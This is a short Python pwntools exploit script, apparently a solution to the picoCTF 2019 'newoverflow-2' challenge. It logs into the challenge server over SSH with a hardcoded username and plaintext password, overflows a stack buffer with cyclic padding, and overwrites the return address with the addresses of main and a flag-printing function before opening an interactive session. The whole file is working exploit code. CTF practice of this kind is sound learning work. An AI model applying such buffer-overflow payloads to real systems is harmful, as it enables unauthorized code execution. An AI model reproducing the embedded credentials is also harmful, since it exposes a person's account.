from pwn import *
import sys

host = '2019shell1.picoctf.com'
user = 'mhsuab'
password = '19980306Hsu'
cwd = '/problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7'

def exploit(s):
    func_flag_addr = 0x40084d
    main_addr = 0x4008ce
    payload = cyclic(100)
    x = payload.find('qaaaraaa')
    print (x)
    payload = b'A' * (x + 8) + p64(main_addr) + p64(func_flag_addr)
    print (payload)

    s.sendlineafter('?\n', payload)
    s.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 1:
        ssh = ssh(host = host, user = user, password = password)
        #ssh.set_working_directory(cwd)
        s = ssh.process('./vuln', cwd = cwd)
        input('PAUSED')
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
